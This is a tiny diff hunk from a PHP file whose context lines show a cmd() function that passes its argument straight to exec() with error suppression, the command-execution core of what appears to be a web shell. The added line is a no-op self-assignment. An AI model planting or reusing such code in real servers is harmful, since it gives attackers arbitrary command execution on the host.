@@ -39,6 +39,7 @@
 	function cmd($cfe) {
 		$res = '';
 		echon($cfe);
+		$cfe = $cfe;
 		if ($cfe) {
 			if(function_exists('exec')) {
 				@exec($cfe,$res);
